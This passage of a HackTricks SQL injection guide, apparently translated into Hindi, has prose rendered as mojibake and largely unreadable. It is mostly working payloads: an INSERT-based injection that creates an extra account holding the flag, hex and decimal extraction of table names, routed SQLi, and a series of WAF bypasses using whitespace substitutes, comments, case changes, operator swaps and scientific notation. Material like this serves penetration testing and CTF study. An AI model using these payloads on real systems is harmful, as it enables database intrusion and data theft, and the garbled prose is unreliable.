- рдЗрд╕рдХреЗ рдлрд▓рд╕реНрд╡рд░реВрдк, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлрд┐рд░ `admin_generic@example.com` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб "bcrypt_hash_of_newpassword" рдХрд╛ рд╣реИ ("bcrypt_hash_of_newpassword" рдирдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ bcrypt рд╣реИрд╢ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣реИрд╢ рд╕реЗ рдмрджрд▓ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП)ред

### рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВ

#### рдПрдХ рд╕рд╛рде 2 рдЦрд╛рддреЗ рдмрдирд╛рдирд╛

рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдИрдореЗрд▓ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╕рдордп:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### рджрд╢рдорд▓рд╡ рдпрд╛ рд╖реЛрдбрд╝рд╢рд╛рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдЖрдк рдХреЗрд╡рд▓ 1 рдЦрд╛рддрд╛ рдмрдирд╛рддреЗ рд╣реБрдП рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреБрдЫ рднреА рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред

**hex2dec** рдФрд░ **substr** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
рдЯреЗрдХреНрдирд┐рдХрд▓ рдЯрд░реНрдорд┐рдиреЛрд▓реЙрдЬреА рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**рд╣реЗрдХреНрд╕** рдФрд░ **рд░рд┐рдкреНрд▓реЗрд╕** (рдФрд░ **рд╕рдмрд╕реНрдЯреНрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдлрд╛рди рдмрд┐рдВрджреБ рд╣реИ рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВред

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

рд░реВрдЯреЗрдб SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдПрдХ рд╕реНрдерд┐рддрд┐ рд╣реИ рдЬрд╣рд╛рдБ рдЗрдиреНрдЬреЗрдХреНрдЯреЗрдмрд▓ рдХреНрд╡реЗрд░реА рд╡рд╣ рдирд╣реАрдВ рд╣реИ рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рджреЗрддреА рд╣реИ рдмрд▓реНрдХрд┐ рдЗрдиреНрдЬреЗрдХреНрдЯреЗрдмрд▓ рдХреНрд╡реЗрд░реА рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдЙрд╕ рдХреНрд╡реЗрд░реА рдореЗрдВ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рджреЗрддреА рд╣реИред ([рдкреЗрдкрд░ рд╕реЗ](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

рдЙрджрд╛рд╣рд░рдг:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF рдмрд╛рдпрдкрд╛рд╕

[рдпрд╣рд╛рдБ рд╕реЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдмрд╛рдпрдкрд╛рд╕](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### рдХреЛрдИ рдЕрдВрддрд░реНрд╡рд┐рд░рд╛рдо рдмрд╛рдпрдкрд╛рд╕

рдХреЛрдИ рдЕрдВрддрд░реНрд╡рд┐рд░рд╛рдо (%20) - рд╡реНрд╣рд╛рдЗрдЯрд╕реНрдкреЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ

рдЬрдм рдЖрдк SQL рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓реЗ рдХреЗ рджреМрд░рд╛рди рдХреЛрдб рдореЗрдВ рдХреЛрдИ рд╡реНрд╣рд╛рдЗрдЯрд╕реНрдкреЗрд╕ рдирд╣реАрдВ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк SQL рдХреНрд╡реЗрд░реА рдореЗрдВ рдЕрдкрдиреЗ рдзрд╛рд░рдХреЛрдВ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╣реИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### рдХреЛрдИ рд╡реНрд╣рд╛рдЗрдЯрд╕реНрдкреЗрд╕ - рдкреИрд░реЗрдВрдереЗрд╕рд┐рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ
```sql
?id=(1)and(1)=(1)--
```
### рдХреЛрдИ рд╡рд┐рд░рд╛рдо рдирд╣реАрдВ

рдСрдлрд╕реЗрдЯ, рдлреНрд░реЙрдо рдФрд░ рдЬреНрд╡рд╛рдЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд░рд╛рдо рдирд╣реАрдВ - рдмрд╛рдпрдкрд╛рд╕
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдпрдкрд╛рд╕

рдХреАрд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ - рдЕрдкрд░рдХреЗрд╕/рд▓реЛрдЕрд░рдХреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
### Blacklist рдХреЗ рд▓рд┐рдП рдХреАрд╡рд░реНрдб рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреЗрд╕ рдЗрдирд╕реЗрдВрд╕рд┐рдЯрд┐рд╡ - рдПрдХ рд╕рдордХрдХреНрд╖ рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ рдиреЛрдЯреЗрд╢рди WAF рдмрд╛рдпрдкрд╛рд╕

рдЖрдк рдЗрд╕ рддрд░рд╣ рдХреЗ рдЯреНрд░рд┐рдХ рдХрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг [gosecure рдмреНрд▓реЙрдЧ](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдореВрд▓ рд░реВрдк рд╕реЗ, рдЖрдк WAF рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рддрд░реАрдХреЛрдВ рдореЗрдВ рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ рдиреЛрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### рдХреЙрд▓рдо рдирд╛рдореЛрдВ рдХреА рдкреНрд░рддрд┐рдмрдВрдзрди рдХреЛ рдЙрдореАрдж рд╕реЗ рдкрд╛рд░ рдХрд░реЗрдВ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **рдореВрд▓ рдХреНрд╡реЗрд░реА рдФрд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк рдЭрдВрдбрд╛ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрдирдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдХреЙрд▓рдо рд╣реИрдВ** рддреЛ рдЖрдк рдмрд╕ рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `0 UNION SELECT * FROM flag`

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк **рдХрд┐рд╕реА рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рддреАрд╕рд░реЗ рдХреЙрд▓рдо рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдмрд┐рдирд╛ рдЙрд╕рдХреЗ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП** рдПрдХ рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЬреИрд╕реЗ: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, рдЗрд╕рд▓рд┐рдП рдПрдХ рдПрд╕рдХреНрдпреВрдПрд▓ рдЗрдиреНрдЬреЗрдХреНрд╢рди рдореЗрдВ рдпрд╣ рдРрд╕рд╛ рджрд┐рдЦреЗрдЧрд╛:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
рдпрд╛ **рдХреЙрдорд╛ рдмрд╛рдпрдкрд╛рд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
рдпрд╣ рдЯреНрд░рд┐рдХ [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) рд╕реЗ рд▓реА рдЧрдИ рдереАред

### WAF рдмрд╛рдпрдкрд╛рд╕ рд╕реБрдЭрд╛рд╡ рдЙрдкрдХрд░рдг

{% embed url="https://github.com/m4ll0k/Atlas" %}

## рдЕрдиреНрдп рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛рдПрдВ

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╣рдЪрд╛рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдЪреНрдЪ рдмрд┐рдВрджреБ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рд╣реИ рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╣реИ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдкрд░рд┐рд╡рд╛рд░**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**ред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
